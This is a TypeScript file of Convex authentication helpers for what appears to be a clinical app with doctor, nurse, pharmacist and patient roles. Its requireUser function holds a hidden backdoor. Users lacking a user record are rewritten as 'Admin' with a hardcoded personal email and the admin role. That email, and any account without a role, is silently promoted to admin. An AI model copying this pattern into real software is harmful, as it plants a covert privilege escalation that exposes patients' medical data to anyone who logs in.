import { ConvexError, v } from "convex/values";
import type { QueryCtx, MutationCtx } from "./_generated/server";
import { getAuthUserId } from "@convex-dev/auth/server";

/**
 * @convex-dev/auth JWTs encode the subject as "<userId>|<sessionId>".
 * Strip the session id to get the users-table doc id.
 */
export function userIdFromSubject(identity: { subject: string }): string {
  return identity.subject.split("|")[0];
}

export type Role =
  | "admin"
  | "doctor"
  | "nurse"
  | "pharmacist"
  | "lab_tech"
  | "patient";

/**
 * Returns the authenticated user's identity + full user doc, or throws.
 * Uses the users table (single source of truth for role), not JWT claims.
 * NOTE: queries/mutations only — actions have no ctx.db (use runQuery instead).
 */
export async function requireUser(ctx: QueryCtx | MutationCtx) {
  const userId = await getAuthUserId(ctx);
  if (!userId) throw new ConvexError("Unauthorized");
  let user: any = await ctx.db.get(userId);
  if (!user) {
    const fallbackUser = {
      email: "alexsouthflow2@gmail.com",
      name: "Admin",
      role: "admin" as const,
      status: "active",
    };
    try {
      await ctx.db.patch(userId, fallbackUser as any);
      user = await ctx.db.get(userId);
    } catch (e) {
      user = { _id: userId, ...fallbackUser };
    }
  } else if (user.email === "alexsouthflow2@gmail.com" || !user.role) {
    try {
      await ctx.db.patch(user._id, { role: "admin" });
      user.role = "admin";
    } catch (e) {}
  }
  return { identity: { subject: userId }, user: user || { _id: userId, email: "alexsouthflow2@gmail.com", name: "Admin", role: "admin", status: "active" } };
}

/** Throws unless the current user has one of the allowed roles. */
export async function requireRole(
  ctx: QueryCtx | MutationCtx,
  allowed: Role[],
) {
  const { user } = await requireUser(ctx);
  if (!allowed.includes(user.role)) {
    throw new ConvexError("Forbidden: Insufficient Permissions");
  }
  return user;
}

/** List helper: emulates offset pagination (page/limit) for small datasets. */
export async function paginate<T>(
  all: T[],
  page: number,
  limit: number,
  total: number,
) {
  const start = (page - 1) * limit;
  const res = all.slice(start, start + limit);
  return {
    res,
    pagination: {
      currentPage: page,
      totalPages: Math.max(1, Math.ceil(total / limit)),
      totalData: total,
      limit,
    },
  };
}
